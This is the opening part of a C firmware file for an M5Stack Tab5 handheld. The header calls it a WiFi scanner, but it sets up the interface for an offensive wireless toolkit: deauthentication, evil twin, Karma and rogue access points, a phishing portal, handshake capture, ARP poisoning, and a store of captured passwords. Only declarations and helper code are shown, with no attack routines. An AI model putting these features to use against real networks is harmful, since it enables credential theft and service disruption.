/*
 * M5Stack Tab5 WiFi Scanner via UART
 * Communicates with ESP32C5 over UART to scan WiFi networks
 * Also supports native WiFi scanning via ESP32C6 (SDIO)
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <math.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/timers.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "driver/uart.h"
#include "driver/gpio.h"
#include "driver/ledc.h"
#include "bsp/m5stack_tab5.h"
#include "lvgl.h"
#include "iot_usbh_cdc.h"
#include "usb/usb_host.h"
#include "usb/usb_helpers.h"
#include "usb/usb_types_ch9.h"

// ESP-Hosted includes for WiFi via ESP32C6 SDIO
#include "esp_hosted.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_event.h"

// Captive portal includes
#include "esp_http_server.h"
#include "lwip/sockets.h"

#define JANOS_TAB_VERSION "1.0.8"
#include "lwip/netdb.h"
#include <dirent.h>
#include <sys/stat.h>

// Audio codec for startup beep (commented out - causes linker issues)
// #include "esp_codec_dev.h"

static const char *TAG = "wifi_scanner";

// UART Configuration for ESP32C5 communication
// Note: TX/RX pins are configured dynamically via get_uart_pins() based on NVS settings
// M5Bus (default): TX=37, RX=38 | Grove: TX=53, RX=54
#define UART_NUM          UART_NUM_1
#define UART_BAUD_RATE    115200
#define UART_BUF_SIZE     4096
#define UART_RX_TIMEOUT   30000  // 30 seconds timeout for scan

// ESP Modem configuration (configurable pins for future external ESP32C5)
#define ESP_MODEM_UART_TX_PIN  GPIO_NUM_37
#define ESP_MODEM_UART_RX_PIN  GPIO_NUM_38

// ESP Modem scan settings
#define ESP_MODEM_MAX_NETWORKS  50

// INA226 Power Monitor Configuration (for battery voltage)
#define INA226_I2C_ADDR         0x41    // M5Tab5 uses address 0x41 (not default 0x40!)
#define INA226_REG_CONFIG       0x00    // Configuration register
#define INA226_REG_SHUNT_VOLT   0x01    // Shunt voltage register
#define INA226_REG_BUS_VOLT     0x02    // Bus voltage register
#define INA226_REG_POWER        0x03    // Power register
#define INA226_REG_CURRENT      0x04    // Current register
#define INA226_REG_CALIB        0x05    // Calibration register
#define INA226_REG_MASK_EN      0x06    // Mask/Enable register
#define INA226_REG_ALERT_LIM    0x07    // Alert limit register
#define INA226_REG_MFG_ID       0xFE    // Manufacturer ID (0x5449)
#define INA226_REG_DIE_ID       0xFF    // Die ID (0x2260)
#define INA226_BUS_VOLT_LSB     1.25f   // 1.25mV per LSB for bus voltage
#define BATTERY_UPDATE_MS       2000    // Update battery status every 2 seconds

// INA226 Calibration (from M5Tab5 official demo)
#define INA226_SHUNT_RESISTANCE 0.005f  // 5 mOhm shunt resistor
#define INA226_MAX_CURRENT      8.192f  // Max expected current in Amps
// Config register value: AVG=16 (010), VBUSCT=1100us (100), VSHCT=1100us (100), MODE=continuous (111)
// Bits: [15:12]=0, [11:9]=010 (AVG=16), [8:6]=100 (VBUS=1100us), [5:3]=100 (VSH=1100us), [2:0]=111 (continuous)
#define INA226_CONFIG_VALUE     0x4527  // AVG=16, 1100us conv times, continuous mode

// Maximum networks to display
#define MAX_NETWORKS      50
#define MAX_OBSERVER_NETWORKS  100  // More capacity for background scanning
#define MAX_CLIENTS_PER_NETWORK  20
#define OBSERVER_POLL_INTERVAL_MS  20000  // 20 seconds
#define OBSERVER_LINE_BUFFER_SIZE  512

// Material Design Colors
#define COLOR_MATERIAL_BG       lv_color_make(18, 18, 18)      // #121212 - dark background
#define COLOR_MATERIAL_BLUE     lv_color_make(33, 150, 243)    // #2196F3
#define COLOR_MATERIAL_RED      lv_color_make(244, 67, 54)     // #F44336
#define COLOR_MATERIAL_PURPLE   lv_color_make(156, 39, 176)    // #9C27B0
#define COLOR_MATERIAL_GREEN    lv_color_make(76, 175, 80)     // #4CAF50
#define COLOR_MATERIAL_AMBER    lv_color_make(255, 193, 7)     // #FFC107
#define COLOR_MATERIAL_CYAN     lv_color_make(0, 188, 212)     // #00BCD4
#define COLOR_MATERIAL_TEAL     lv_color_make(0, 150, 136)     // #009688 - Kismet-style teal
#define COLOR_MATERIAL_ORANGE   lv_color_make(255, 152, 0)     // #FF9800
#define COLOR_MATERIAL_PINK     lv_color_make(233, 30, 99)     // #E91E63

// Tab bar colors
#define TAB_COLOR_UART1_ACTIVE    0x00BCD4  // Cyan
#define TAB_COLOR_UART1_INACTIVE  0x006064  // Dark Cyan
#define TAB_COLOR_MBUS_ACTIVE    0xFF9800  // Orange
#define TAB_COLOR_MBUS_INACTIVE  0x804D00  // Dark Orange
#define TAB_COLOR_INTERNAL_ACTIVE 0x9C27B0  // Purple
#define TAB_COLOR_INTERNAL_INACTIVE 0x4A148C  // Dark Purple

// Screenshot feature - set to false to disable screenshot on LABORATORIUM tap
#define SCREENSHOT_ENABLED true
#define SCREENSHOT_DIR "/sdcard/screenshots"

// WiFi network info structure
typedef struct {
    int index;
    char ssid[33];
    char bssid[18];
    int rssi;
    char band[8];  // "2.4GHz" or "5GHz"
    char security[24];
} wifi_network_t;

// Observer network info structure (for sniffer results)
typedef struct {
    char ssid[33];
    char bssid[18];      // MAC address of AP
    int scan_index;      // 1-based index from scan_networks (for select_networks command)
    int channel;
    int rssi;            // Signal strength in dBm
    char band[8];        // "2.4GHz" or "5GHz"
    int client_count;
    char clients[MAX_CLIENTS_PER_NETWORK][18];  // MAC addresses of clients
} observer_network_t;

// Deauth Detector entry
#define DEAUTH_DETECTOR_MAX_ENTRIES 200
typedef struct {
    int channel;
    char ap_name[33];
    char bssid[18];
    int rssi;
} deauth_entry_t;

// BT device storage
#define BT_MAX_DEVICES 50
typedef struct {
    char mac[18];
    int rssi;
    char name[64];
} bt_device_t;

// Karma probe storage
#define KARMA_MAX_PROBES 64
typedef struct {
    int index;
    char ssid[33];
} karma_probe_t;

// Evil Twin entry storage
#define EVIL_TWIN_MAX_ENTRIES 32
typedef struct {
    char ssid[33];
    char password[65];
} evil_twin_entry_t;

// ARP Host storage
#define ARP_MAX_HOSTS 64
typedef struct {
    char ip[20];
    char mac[18];
} arp_host_t;

// Wardrive network storage
#define WARDRIVE_MAX_NETWORKS 100
typedef struct {
    char ssid[33];
    char bssid[18];
    char security[28];
    char lat[14];
    char lon[14];
} wardrive_network_t;

// Karma2 constants (for Observer)
#define KARMA2_MAX_PROBES 64
#define KARMA2_MAX_HTML_FILES 20

// ============================================================================
// COMPLETE TAB CONTEXT - All UI, data, and state for one tab (Grove/USB/MBus/INTERNAL)
// Each tab is a fully independent space with its own LVGL objects and state
// ============================================================================
typedef struct {
    // =====================================================================
    // MAIN CONTAINER AND NAVIGATION
    // =====================================================================
    lv_obj_t *container;           // Main container for this tab
    lv_obj_t *tiles;               // Main tiles
    lv_obj_t *current_visible_page;
    
    // =====================================================================
    // WIFI SCAN & ATTACK - Page and all elements
    // =====================================================================
    lv_obj_t *scan_page;
    lv_obj_t *scan_btn;
    lv_obj_t *scan_status_label;
    lv_obj_t *network_list;
    lv_obj_t *spinner;
    
    wifi_network_t *networks;           // PSRAM
    int network_count;
    int selected_indices[MAX_NETWORKS];
    int selected_count;
    bool scan_in_progress;
    
    // Network popup (clients, deauth)
    lv_obj_t *network_popup;
    lv_obj_t *popup_clients_container;
    int popup_network_idx;
    bool popup_open;
    TimerHandle_t popup_timer;
    
    // Deauth popup
    lv_obj_t *deauth_popup;
    lv_obj_t *deauth_btn;
    lv_obj_t *deauth_btn_label;
    int deauth_network_idx;
    int deauth_client_idx;
    bool deauth_active;
    
    // Scan Deauth popup
    lv_obj_t *scan_deauth_overlay;
    lv_obj_t *scan_deauth_popup;
    
    // Evil Twin popup
    lv_obj_t *evil_twin_overlay;
    lv_obj_t *evil_twin_popup;
    lv_obj_t *evil_twin_network_dropdown;
    lv_obj_t *evil_twin_html_dropdown;
    lv_obj_t *evil_twin_status_label;
    char evil_twin_html_files[20][64];
    int evil_twin_html_count;
    volatile bool evil_twin_monitoring;
    TaskHandle_t evil_twin_task;
    
    // SAE popup
    lv_obj_t *sae_popup_overlay;
    lv_obj_t *sae_popup;
    
    // Handshaker popup (per-network)
    lv_obj_t *handshaker_popup_overlay;
    lv_obj_t *handshaker_popup;
    lv_obj_t *handshaker_log_container;  // Scrollable container for log
    lv_obj_t *handshaker_status_label;   // Label inside log container
    char handshaker_log_buffer[2048];    // Accumulated log messages
    volatile bool handshaker_monitoring;
    TaskHandle_t handshaker_task;
    
    // =====================================================================
    // NETWORK OBSERVER - Page and all elements
    // =====================================================================
    lv_obj_t *observer_page;
    lv_obj_t *observer_start_btn;
    lv_obj_t *observer_stop_btn;
    lv_obj_t *observer_table;
    lv_obj_t *observer_status_label;
    
    observer_network_t *observer_networks;  // PSRAM
    int observer_network_count;
    bool observer_running;
    bool observer_page_visible;
    TaskHandle_t observer_task;
    TimerHandle_t observer_timer;
    
    // Karma2 (Probes & Karma on Observer)
    lv_obj_t *karma2_probes_popup_overlay;
    lv_obj_t *karma2_probes_popup;
    lv_obj_t *karma2_html_popup_overlay;
    lv_obj_t *karma2_html_popup;
    lv_obj_t *karma2_html_dropdown;
    lv_obj_t *karma2_attack_popup_overlay;
    lv_obj_t *karma2_attack_popup;
    lv_obj_t *karma2_attack_status_label;
    char karma2_probes[KARMA2_MAX_PROBES][33];
    int karma2_probe_count;
    int karma2_selected_probe_idx;
    char karma2_html_files[KARMA2_MAX_HTML_FILES][64];
    int karma2_html_count;
    
    // =====================================================================
    // GLOBAL WIFI ATTACKS - Page and all attacks
    // =====================================================================
    lv_obj_t *global_attacks_page;
    
    // Blackout
    lv_obj_t *blackout_popup_overlay;
    lv_obj_t *blackout_popup;
    bool blackout_running;
    
    // SnifferDog
    lv_obj_t *snifferdog_popup_overlay;
    lv_obj_t *snifferdog_popup;
    bool snifferdog_running;
    
    // Global Handshaker
    lv_obj_t *global_handshaker_popup_overlay;
    lv_obj_t *global_handshaker_popup;
    lv_obj_t *global_handshaker_log_container;
    lv_obj_t *global_handshaker_status_label;
    char global_handshaker_log_buffer[2048];
    volatile bool global_handshaker_monitoring;
    TaskHandle_t global_handshaker_task;
    
    // Phishing Portal (from Global Attacks)
    lv_obj_t *phishing_portal_popup_overlay;
    lv_obj_t *phishing_portal_popup;
    lv_obj_t *phishing_portal_ssid_textarea;
    lv_obj_t *phishing_portal_keyboard;
    lv_obj_t *phishing_portal_html_dropdown;
    lv_obj_t *phishing_portal_status_label;
    lv_obj_t *phishing_portal_data_label;
    char phishing_portal_ssid[64];
    int phishing_portal_submit_count;
    volatile bool phishing_portal_monitoring;
    TaskHandle_t phishing_portal_task;
    
    // Wardrive
    lv_obj_t *wardrive_page;
    lv_obj_t *wardrive_start_btn;
    lv_obj_t *wardrive_stop_btn;
    lv_obj_t *wardrive_status_label;
    lv_obj_t *wardrive_table;
    lv_obj_t *wardrive_gps_overlay;
    lv_obj_t *wardrive_gps_popup;
    lv_obj_t *wardrive_gps_label;
    volatile bool wardrive_monitoring;
    bool wardrive_gps_fix;
    TaskHandle_t wardrive_task;
    wardrive_network_t wardrive_networks[WARDRIVE_MAX_NETWORKS];
    int wardrive_net_count;
    int wardrive_net_head;
    lv_obj_t *wardrive_gps_type_btn;
    lv_obj_t *wardrive_gps_type_overlay;
    lv_obj_t *wardrive_gps_type_response_label;
    
    // =====================================================================
    // COMPROMISED DATA - Page and sub-pages
    // =====================================================================
    lv_obj_t *compromised_data_page;
    lv_obj_t *evil_twin_passwords_page;
    lv_obj_t *portal_data_page;
    lv_obj_t *handshakes_page;
    
    evil_twin_entry_t *evil_twin_entries;  // PSRAM
    int evil_twin_entry_count;
    
    // Evil Twin -> ARP integration popup
    lv_obj_t *evil_twin_connect_popup_overlay;
    lv_obj_t *evil_twin_connect_popup;
    
    // =====================================================================
    // DEAUTH DETECTOR - Page and data
    // =====================================================================
    lv_obj_t *deauth_detector_page;
    lv_obj_t *deauth_detector_table;
    lv_obj_t *deauth_detector_start_btn;
    lv_obj_t *deauth_detector_stop_btn;
    
    deauth_entry_t *deauth_entries;  // PSRAM
    int deauth_entry_count;
    volatile bool deauth_detector_running;
    TaskHandle_t deauth_detector_task;
    
    // =====================================================================
    // BLUETOOTH - Menu and sub-pages
    // =====================================================================
    lv_obj_t *bt_menu_page;
    
    // AirTag Scan
    lv_obj_t *bt_airtag_page;
    lv_obj_t *airtag_count_label;
    lv_obj_t *smarttag_count_label;
    volatile bool airtag_scanning;
    TaskHandle_t airtag_task;
    
    // BT Scan & Locate
    lv_obj_t *bt_scan_page;
    bt_device_t *bt_devices;  // PSRAM
    int bt_device_count;
    
    // BT Locator Tracking
    lv_obj_t *bt_locator_page;
    lv_obj_t *bt_locator_rssi_label;
    char bt_locator_target_mac[18];
    char bt_locator_target_name[64];
    volatile bool bt_locator_tracking;
    TaskHandle_t bt_locator_task;
    
    // =====================================================================
    // KARMA - Page and data
    // =====================================================================
    lv_obj_t *karma_page;
    lv_obj_t *karma_status_label;
    lv_obj_t *karma_probes_container;
    lv_obj_t *karma_start_btn;
    lv_obj_t *karma_stop_btn;
    lv_obj_t *karma_show_probes_btn;
    lv_obj_t *karma_html_popup_overlay;
    lv_obj_t *karma_html_popup;
    lv_obj_t *karma_html_dropdown;
    lv_obj_t *karma_attack_popup_overlay;
    lv_obj_t *karma_attack_popup;
    lv_obj_t *karma_attack_ssid_label;
    lv_obj_t *karma_attack_mac_label;
    lv_obj_t *karma_attack_password_label;
    
    karma_probe_t *karma_probes;  // PSRAM
    int karma_probe_count;
    int karma_selected_probe_idx;
    volatile bool karma_sniffer_running;
    volatile bool karma_monitoring;
    char karma_html_files[20][64];
    int karma_html_count;
    TaskHandle_t karma_task;
    
    // =====================================================================
    // ARP POISON - Page and data (accessible from Evil Twin)
    // =====================================================================
    lv_obj_t *arp_poison_page;
    lv_obj_t *arp_password_input;
    lv_obj_t *arp_keyboard;
    lv_obj_t *arp_connect_btn;
    lv_obj_t *arp_status_label;
    lv_obj_t *arp_hosts_container;
    lv_obj_t *arp_list_hosts_btn;
    lv_obj_t *arp_attack_popup_overlay;
    lv_obj_t *arp_attack_popup;
    
    char arp_target_ssid[33];
    char arp_target_password[65];
    char arp_our_ip[20];
    bool arp_wifi_connected;
    bool arp_auto_mode;
    arp_host_t *arp_hosts;  // PSRAM
    int arp_host_count;
    
    // =====================================================================
    // ROGUE AP - Page and data
    // =====================================================================
    lv_obj_t *rogue_ap_page;
    lv_obj_t *rogue_ap_password_input;
    lv_obj_t *rogue_ap_keyboard;
    lv_obj_t *rogue_ap_html_dropdown;
    lv_obj_t *rogue_ap_start_btn;
    lv_obj_t *rogue_ap_popup_overlay;
    lv_obj_t *rogue_ap_popup;
    lv_obj_t *rogue_ap_status_label;
    char rogue_ap_ssid[33];
    char rogue_ap_password[65];
    volatile bool rogue_ap_monitoring;
    TaskHandle_t rogue_ap_task;
    
    // Transport type for this tab context
    uint8_t transport_kind;  // 0=Grove, 1=USB, 2=MBus, 3=INTERNAL
    
    // SD card presence (detected via list_sd command)
    bool sd_card_present;  // true if SD card detected on this UART/device
} tab_context_t;

typedef enum {
    TAB_GROVE = 0,
    TAB_USB = 1,
    TAB_MBUS = 2,
    TAB_INTERNAL = 3,
} tab_id_t;

typedef enum {
    TRANSPORT_GROVE = 0,
    TRANSPORT_USB = 1,
    TRANSPORT_MBUS = 2,
    TRANSPORT_INTERNAL = 3,
} transport_kind_t;

// Tab contexts (Grove, USB, MBus, INTERNAL)
static tab_context_t grove_ctx = {0};
static tab_context_t usb_ctx = {0};
static tab_context_t mbus_ctx = {0};
static tab_context_t internal_ctx = {0};

// Red Team mode - controls visibility of offensive features (declared early for use in all functions)
static bool enable_red_team = false;  // Default: false (safe mode)

// Legacy compatibility - kept for minimal code changes
static wifi_network_t networks[MAX_NETWORKS];  // Temporary buffer during scan
static int network_count = 0;
static bool scan_in_progress = false;
static int selected_network_indices[MAX_NETWORKS];
static int selected_network_count = 0;

// Observer global variables (large arrays in PSRAM)
static observer_network_t *observer_networks = NULL;  // Allocated in PSRAM
static TimerHandle_t observer_timer = NULL;
// Note: observer_task_handle is now per-context (ctx->observer_task)
#define POPUP_POLL_INTERVAL_MS  10000  // 10 seconds

// Deauth popup state
static bool deauth_active = false;
static int deauth_network_idx = -1;
static int deauth_client_idx = -1;
static lv_obj_t *deauth_popup_obj = NULL;
static lv_obj_t *deauth_btn = NULL;
static lv_obj_t *deauth_btn_label = NULL;

// Evil Twin attack state
static lv_obj_t *evil_twin_loading_overlay = NULL;  // Loading overlay while fetching
static int evil_twin_html_count = 0;

// Handshaker attack state
static lv_obj_t *handshaker_log_container = NULL;
static lv_obj_t *handshaker_status_label = NULL;
static char handshaker_log_buffer[2048] = {0};
static volatile bool handshaker_monitoring = false;
static TaskHandle_t handshaker_monitor_task_handle = NULL;
static char evil_twin_html_files[20][64];  // Max 20 files, 64 chars each
static volatile bool evil_twin_monitoring = false;
static TaskHandle_t evil_twin_monitor_task_handle = NULL;

// PSRAM buffers for observer (allocated once)
static char *observer_rx_buffer = NULL;
static char *observer_line_buffer = NULL;

// LVGL UI elements - pages
static lv_obj_t *tiles_container = NULL;
static lv_obj_t *scan_page = NULL;
static lv_obj_t *observer_page = NULL;
static lv_obj_t *esp_modem_page = NULL;
static lv_obj_t *global_attacks_page = NULL;
static lv_obj_t *settings_page = NULL;

// MBus port (UART2)
#define UART2_NUM UART_NUM_2
static bool uart2_initialized = false;

// Board detection state - 3 independent devices
static bool grove_detected = false;
static bool usb_detected = false;
static bool uart1_detected = false;  // Derived: Grove or USB
static bool mbus_detected = false;

// SD card presence on Tab5 itself (checked via /sdcard mount point)
static bool internal_sd_present = false;
static bool board_detection_popup_open = false;
static lv_timer_t *board_detect_retry_timer = NULL;
static lv_obj_t *board_detect_popup = NULL;
static lv_obj_t *board_detect_overlay = NULL;

// Initial detection popup (shown before building UI)
static lv_obj_t *detection_popup_overlay = NULL;
static lv_timer_t *detection_timer = NULL;

// Observer state
static bool observer_page_visible = false;     // Observer page is currently shown

// Portal background mode
static bool portal_background_mode = false;     // Portal running in background
static int portal_new_data_count = 0;           // Count of new passwords since last view
static lv_obj_t *portal_icon = NULL;            // Portal icon in status bar

// Tab-based UI state
static tab_id_t current_tab = TAB_INTERNAL;     // Active tab id
static uint8_t portal_started_by_uart = 0;      // 0=none/Internal, 1=Grove/USB, 2=MBus
static lv_obj_t *tab_bar = NULL;                // Tab bar container
static lv_obj_t *grove_tab_btn = NULL;          // Grove tab button
static lv_obj_t *usb_tab_btn = NULL;            // USB tab button
static lv_obj_t *mbus_tab_btn = NULL;          // MBus tab button
static lv_obj_t *internal_tab_btn = NULL;       // INTERNAL tab button

// Tab content containers (persistent, hidden/shown)
static lv_obj_t *grove_container = NULL;
static lv_obj_t *usb_container = NULL;
static lv_obj_t *mbus_container = NULL;
static lv_obj_t *internal_container = NULL;

// INTERNAL tab page objects
static lv_obj_t *internal_tiles = NULL;
static lv_obj_t *internal_settings_page = NULL;

// Helper to get current tab's context
static tab_context_t* get_current_ctx(void) {
    switch (current_tab) {
        case TAB_GROVE: return &grove_ctx;
        case TAB_USB: return &usb_ctx;
        case TAB_MBUS: return &mbus_ctx;
        case TAB_INTERNAL: return &internal_ctx;
        default: return &internal_ctx;
    }
}

static tab_id_t tab_id_for_ctx(const tab_context_t *ctx) {
    if (ctx == &grove_ctx) return TAB_GROVE;
    if (ctx == &usb_ctx) return TAB_USB;
    if (ctx == &mbus_ctx) return TAB_MBUS;
    return TAB_INTERNAL;
}

// Helper to get current tab's container (from global variables)
static lv_obj_t* get_current_tab_container(void) {
    switch (current_tab) {
        case TAB_GROVE: return grove_container;
        case TAB_USB: return usb_container;
        case TAB_MBUS: return mbus_container;
        case TAB_INTERNAL: return internal_container;
        default: return internal_container;
    }
}

static tab_context_t* get_ctx_for_tab(tab_id_t tab) {
    switch (tab) {
        case TAB_GROVE: return &grove_ctx;
        case TAB_USB: return &usb_ctx;
        case TAB_MBUS: return &mbus_ctx;
        case TAB_INTERNAL: return &internal_ctx;
        default: return &internal_ctx;
    }
}

static lv_obj_t* get_container_for_tab(tab_id_t tab) {
    switch (tab) {
        case TAB_GROVE: return grove_container;
        case TAB_USB: return usb_container;
        case TAB_MBUS: return mbus_container;
        case TAB_INTERNAL: return internal_container;
        default: return internal_container;
    }
}

static bool tab_is_uart1(tab_id_t tab) {
    return (tab == TAB_GROVE || tab == TAB_USB);
}

static bool tab_is_mbus(tab_id_t tab) {
    return (tab == TAB_MBUS);
}

static bool tab_is_internal(tab_id_t tab) {
    return (tab == TAB_INTERNAL);
}

static const char* tab_transport_name(tab_id_t tab) {
    switch (tab) {
        case TAB_GROVE: return "Grove";
        case TAB_USB: return "USB";
        case TAB_MBUS: return "MBus";
        case TAB_INTERNAL: return "INTERNAL";
        default: return "INTERNAL";
    }
}

static uint8_t uart_index_for_tab(tab_id_t tab) {
    if (tab_is_uart1(tab)) return 1;
    if (tab_is_mbus(tab)) return 2;
    return 0;
}

static uart_port_t uart_port_for_tab(tab_id_t tab) {
    return tab_is_mbus(tab) ? UART2_NUM : UART_NUM;
}

// Helper to hide all pages in a tab's context (call before showing a new page)
static void hide_all_pages(tab_context_t *ctx) {
    if (ctx->tiles) lv_obj_add_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
    if (ctx->scan_page) lv_obj_add_flag(ctx->scan_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->observer_page) lv_obj_add_flag(ctx->observer_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->global_attacks_page) lv_obj_add_flag(ctx->global_attacks_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->karma_page) lv_obj_add_flag(ctx->karma_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->compromised_data_page) lv_obj_add_flag(ctx->compromised_data_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->evil_twin_passwords_page) lv_obj_add_flag(ctx->evil_twin_passwords_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->portal_data_page) lv_obj_add_flag(ctx->portal_data_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->handshakes_page) lv_obj_add_flag(ctx->handshakes_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->deauth_detector_page) lv_obj_add_flag(ctx->deauth_detector_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->bt_menu_page) lv_obj_add_flag(ctx->bt_menu_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->bt_airtag_page) lv_obj_add_flag(ctx->bt_airtag_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->bt_scan_page) lv_obj_add_flag(ctx->bt_scan_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->bt_locator_page) lv_obj_add_flag(ctx->bt_locator_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->arp_poison_page) lv_obj_add_flag(ctx->arp_poison_page, LV_OBJ_FLAG_HIDDEN);
    if (ctx->wardrive_page) lv_obj_add_flag(ctx->wardrive_page, LV_OBJ_FLAG_HIDDEN);
}

// Initialize tab context - allocate PSRAM for large data arrays
static void init_tab_context(tab_context_t *ctx) {
    // WiFi scan results
    if (!ctx->networks) {
        ctx->networks = heap_caps_calloc(MAX_NETWORKS, sizeof(wifi_network_t), MALLOC_CAP_SPIRAM);
        if (!ctx->networks) {
            ESP_LOGE(TAG, "Failed to allocate networks in PSRAM");
        }
    }
    
    // Observer networks
    if (!ctx->observer_networks) {
        ctx->observer_networks = heap_caps_calloc(MAX_OBSERVER_NETWORKS, sizeof(observer_network_t), MALLOC_CAP_SPIRAM);
        if (!ctx->observer_networks) {
            ESP_LOGE(TAG, "Failed to allocate observer_networks in PSRAM");
        }
    }
    
    // Deauth detector entries
    if (!ctx->deauth_entries) {
        ctx->deauth_entries = heap_caps_calloc(DEAUTH_DETECTOR_MAX_ENTRIES, sizeof(deauth_entry_t), MALLOC_CAP_SPIRAM);
        if (!ctx->deauth_entries) {
            ESP_LOGE(TAG, "Failed to allocate deauth_entries in PSRAM");
        }
    }
    
    // BT devices
    if (!ctx->bt_devices) {
        ctx->bt_devices = heap_caps_calloc(BT_MAX_DEVICES, sizeof(bt_device_t), MALLOC_CAP_SPIRAM);
        if (!ctx->bt_devices) {
            ESP_LOGE(TAG, "Failed to allocate bt_devices in PSRAM");
        }
    }
    
    // Karma probes
    if (!ctx->karma_probes) {
        ctx->karma_probes = heap_caps_calloc(KARMA_MAX_PROBES, sizeof(karma_probe_t), MALLOC_CAP_SPIRAM);
        if (!ctx->karma_probes) {
            ESP_LOGE(TAG, "Failed to allocate karma_probes in PSRAM");
        }
    }
    
    // Evil twin entries
    if (!ctx->evil_twin_entries) {
        ctx->evil_twin_entries = heap_caps_calloc(EVIL_TWIN_MAX_ENTRIES, sizeof(evil_twin_entry_t), MALLOC_CAP_SPIRAM);
        if (!ctx->evil_twin_entries) {
            ESP_LOGE(TAG, "Failed to allocate evil_twin_entries in PSRAM");
        }
    }
    
    // ARP hosts
    if (!ctx->arp_hosts) {
        ctx->arp_hosts = heap_caps_calloc(ARP_MAX_HOSTS, sizeof(arp_host_t), MALLOC_CAP_SPIRAM);
        if (!ctx->arp_hosts) {
            ESP_LOGE(TAG, "Failed to allocate arp_hosts in PSRAM");
        }
    }
    
    ESP_LOGI(TAG, "Tab context initialized with PSRAM allocations");
}

// Initialize all tab contexts
static void init_all_tab_contexts(void) {
    ESP_LOGI(TAG, "Initializing all tab contexts with PSRAM...");
    init_tab_context(&grove_ctx);
    init_tab_context(&usb_ctx);
    init_tab_context(&mbus_ctx);
    // internal_ctx doesn't need most allocations, but init anyway for safety
    init_tab_context(&internal_ctx);
}

// Restore a tab's context to global variables (for legacy code compatibility)
static void restore_tab_context_to_globals(tab_context_t *ctx) {
    if (!ctx) return;
    
    // Restore WiFi scan results (only if no scan is in progress)
    if (!scan_in_progress) {
        if (ctx->networks && ctx->network_count > 0) {
            memcpy(networks, ctx->networks, sizeof(wifi_network_t) * MAX_NETWORKS);
            network_count = ctx->network_count;
            memcpy(selected_network_indices, ctx->selected_indices, sizeof(selected_network_indices));
            selected_network_count = ctx->selected_count;
            ESP_LOGI(TAG, "Restored %d scan results (%d selected) from context to globals", network_count, selected_network_count);
        } else {
            // Clear globals if context has no data
            network_count = 0;
            selected_network_count = 0;
        }
    } else {
        ESP_LOGI(TAG, "Skipping scan results restore - scan in progress");
    }
    
    // Observer now uses ctx-> directly, no need to restore globals
    // Each tab has its own independent observer data in ctx->observer_networks
    ESP_LOGI(TAG, "Tab %d observer_running=%d, network_count=%d",
             (int)tab_id_for_ctx(ctx),
             ctx->observer_running,
             ctx->observer_network_count);
    
}

// Save global variables back to tab context (call BEFORE switching tabs)
static void save_globals_to_tab_context(tab_context_t *ctx) {
    if (!ctx) return;
    
    // Save WiFi scan results and selections
    if (ctx->networks) {
        memcpy(ctx->networks, networks, sizeof(wifi_network_t) * MAX_NETWORKS);
        ctx->network_count = network_count;
        memcpy(ctx->selected_indices, selected_network_indices, sizeof(selected_network_indices));
        ctx->selected_count = selected_network_count;
        ESP_LOGI(TAG, "Saved %d scan results (%d selected) from globals to context", network_count, selected_network_count);
    }
    
    // Observer now uses ctx-> directly, no need to copy from globals
}

// ESP Modem global variables
static wifi_ap_record_t *esp_modem_networks = NULL;  // Allocated in PSRAM
static uint16_t esp_modem_network_count = 0;
static bool esp_modem_scan_in_progress = false;
static bool esp_modem_wifi_initialized = false;

// INA226 Power Monitor
static i2c_master_dev_handle_t ina226_dev_handle = NULL;
static bool ina226_initialized = false;

// Battery status bar
static lv_obj_t *status_bar = NULL;
static lv_obj_t *battery_voltage_label = NULL;
static lv_obj_t *charging_status_label = NULL;
static lv_timer_t *battery_update_timer = NULL;
static float current_battery_voltage = 0.0f;
static bool current_charging_status = false;

// LVGL UI elements - scan page
static lv_obj_t *scan_btn = NULL;
static lv_obj_t *status_label = NULL;
static lv_obj_t *network_list = NULL;
static lv_obj_t *spinner = NULL;
static lv_obj_t *scan_overlay = NULL;

// Splash screen
static lv_obj_t *splash_screen = NULL;
static lv_obj_t *splash_label = NULL;
static lv_timer_t *splash_timer = NULL;
static int glitch_frame = 0;

// Screen timeout/dimming
#define SCREEN_TIMEOUT_MS       30000  // 30 seconds (default, overridden by setting)
#define SCREEN_CHECK_INTERVAL   1000   // Check every 1 second
static uint32_t last_activity_time = 0;
static bool screen_dimmed = false;
static lv_timer_t *screen_timeout_timer = NULL;
static lv_obj_t *sleep_overlay = NULL;  // Invisible overlay to capture wake touch

// Screen settings (loaded from NVS)
// screen_timeout_setting: 0=10s, 1=30s, 2=1min, 3=5min, 4=StaysOn
static uint8_t screen_timeout_setting = 1;  // Default: 30s (index 1)
static uint8_t screen_brightness_setting = 80;  // Default: 80%

// LVGL UI elements - observer page
static lv_obj_t *observer_start_btn = NULL;
static lv_obj_t *observer_stop_btn = NULL;
static lv_obj_t *observer_table = NULL;
static lv_obj_t *observer_status_label = NULL;

// LVGL UI elements - ESP Modem page
static lv_obj_t *esp_modem_scan_btn = NULL;
static lv_obj_t *esp_modem_status_label = NULL;
static lv_obj_t *esp_modem_network_list = NULL;
static lv_obj_t *esp_modem_spinner = NULL;

// Blackout - uses per-tab context (ctx->blackout_*)
// SnifferDog - uses per-tab context (ctx->snifferdog_*)

// LVGL UI elements - SD card warning popup
static lv_obj_t *sd_warning_popup_overlay = NULL;
static lv_obj_t *sd_warning_popup_obj = NULL;
typedef void (*sd_warning_continue_cb_t)(void);
static sd_warning_continue_cb_t sd_warning_pending_action = NULL;
static bool sd_warning_acknowledged = false;  // Set to true when user clicks "Continue Anyway"

// Global Handshaker - uses per-tab context (ctx->global_handshaker_*)

// LVGL UI elements - Phishing Portal popup
